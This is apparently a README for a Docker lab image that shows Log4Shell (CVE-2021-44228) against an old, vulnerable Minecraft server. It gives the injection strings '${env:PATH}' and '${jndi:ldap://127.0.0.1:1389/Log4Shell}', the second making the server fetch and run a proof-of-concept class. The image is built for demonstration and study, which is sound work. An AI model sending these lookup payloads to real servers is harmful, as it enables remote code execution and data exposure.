# Minecraft Log4shell CVE-2021-44228

For more information about the vulnerability and this Docker image, see [my blog post about Log4shell in Minecraft](https://malwarelab.eu/posts/log4shell-minecraft/).

```
podman pull docker.io/lacike3/attacks-demo:minecraft-log4shell
```

The Docker image contains the old version of Minecraft 1.8.8 with vulnerable version of Log4j library. It also contains old version of Java 8u181. This is one of the versions allowing the remote code execution through JNDI lookups with LDAP names. You can find more details about the Log4j exploitation vectors and affected Java runtime versions in [this post by Moritz Bechler](https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection/).

There is also the [marshalsec](https://github.com/mbechler/marshalsec) tool for redirecting the LDAP references to a Java class served by simple Python webserver.

The POC Java class just executes the `whoami` command and prints a simple message.

![Minecraft Log4shell Demonstration](./minecraft-log4shell.gif)

## Build

```
podman build --rm -t minecraft-log4shell -f Dockerfile .
```

## Usage

For simple demo and playing with the vulnerable Minecraft server in the tmux session, just run

```
podman run --rm -it attacks-demo:minecraft-log4shell
```

and then navigate to the Minecraft window with CTRL+B and Up. You can send the chat messages in behalf of the server with the command `say`, e.g.:
* `say hello`
* `say ${env:PATH}` (example of environment variable lookup)
* `say ${jndi:ldap://127.0.0.1:1389/Log4Shell}` (example of JNDI LDAP lookup, which downloads and executes POC.class by the vulnerable Minecraft server)

For stopping the server, just type `stop`. For another commands and help, type `help`.

If you wish to connect your Minecraft client to the vulnerable Minecraft server and send the above messages by the player to the chat, you can expose the Minecraft server to the host:

```
podman run --rm -it -p 25565:25565 attacks-demo:minecraft-log4shell
```
